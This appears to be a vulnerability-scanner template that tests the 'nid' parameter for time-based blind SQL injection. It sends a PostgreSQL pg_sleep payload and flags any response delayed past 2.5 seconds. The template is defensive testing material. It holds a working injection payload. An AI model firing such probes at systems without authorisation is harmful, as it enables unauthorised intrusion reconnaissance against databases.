id: sqli-time3-232
name: 'Delay probe in nid'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via nid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      nid:
        - ''' OR (SELECT pg_sleep(3))--'
    matchers:
      - type: time
        ms: 2500
